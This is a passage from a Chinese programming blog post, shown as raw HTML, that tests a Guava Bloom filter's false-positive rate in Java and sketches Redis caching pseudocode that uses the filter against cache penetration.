</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">20000</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-22\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-23\"><span class=\"crayon-h\">                </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">add</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-24\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-25\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"误判的数量：\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">list</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">size</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b0e478434966-28\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b0e478434966-29\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0052 seconds] -->\r\n<p>输出结果如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b11539128600\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n误判对数量：330</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b11539128600-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b11539128600-1\">误判对数量：<span class=\"crayon-cn\">330</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>如果上述代码所示，我们故意取10000个不在过滤器里的值，却还有330个被认为在过滤器里，这说明了误判率为0.03.即，在不做任何设置的情况下，默认的误判率为0.03。<br>\n下面上源码来证明：<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/7e2c12c502f40a42548913672b197171.png\" alt=\"image\"></p>\n<p>接下来我们来看一下，误判率为0.03时，底层维护的bit数组的长度如下图所示<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/b3087588fd2780c158760d1e703c351c.png\" alt=\"image\"></p>\n<p>将bloomfilter的构造方法改为</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b15589991762\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nprivate static BloomFilter&lt;Integer&gt; bloomFilter = BloomFilter.create(Funnels.integerFunnel(), size,0.01);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b15589991762-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b15589991762-1\"><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">Integer</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bloomFilter</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">BloomFilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">create</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Funnels</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">integerFunnel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">size</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">0.01</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>即，此时误判率为0.01。在这种情况下，底层维护的bit数组的长度如下图所示<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/d55492c1278a634aeea2d32c2440e379.png\" alt=\"image\"><br>\n由此可见，误判率越低，则底层维护的数组越长，占用空间越大。因此，误判率实际取值，根据服务器所能够承受的负载来决定，不是拍脑袋瞎想的。</p>\n<h4 id=\"实际使用\">3、实际使用</h4>\n<p>redis伪代码如下所示</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe195b18602727636\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nString get(String key) {  \r\n   String value = redis.get(key);  \r\n   if (value  == null) {  \r\n        if(!bloomfilter.mightContain(key)){\r\n            return null;\r\n        }else{\r\n           value = db.get(key);  \r\n           redis.set(key, value);  \r\n        }\r\n    } \r\n    return value；\r\n} </textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe195b18602727636-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe195b18602727636-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-1\"><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-3\"><span class=\"crayon-h\">   </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">value</span><span class=\"crayon-h\">  </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">bloomfilter</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">mightContain</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">null</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span><span class=\"crayon-st\">else</span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-7\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">value</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">db</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-8\"><span class=\"crayon-h\">           </span><span class=\"crayon-v\">redis</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">set</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">key</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">value</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-9\"><span class=\"crayon-h\">        </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b623fe195b18602727636-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">value</span>；</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe195b18602727636-12\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0021 seconds] -->\r\n<p><strong>优点:</strong></p>\n<ol>\n<li>思路简单</li>\n<li>保证一致性</li>\n<li>性能强</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>代码复杂度增大</li>\n<li>需要另外维护一个集合来存放缓存的Key</li>\n<li>布隆过滤器不支持删值操作</li>\n</ol>\n<h2 id=\"总结\">总结</h2>\n<p>在总结部分，来个漫画把。希望对大家找工作有帮助<br>\n<img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/ef43eacdd2710eff0fbe24e391486c82.png\" alt=\"image\"></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114012\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114012votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114012\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/117976068e2e847f1067d25ea3fa90a3b5a60f3f.jpg"}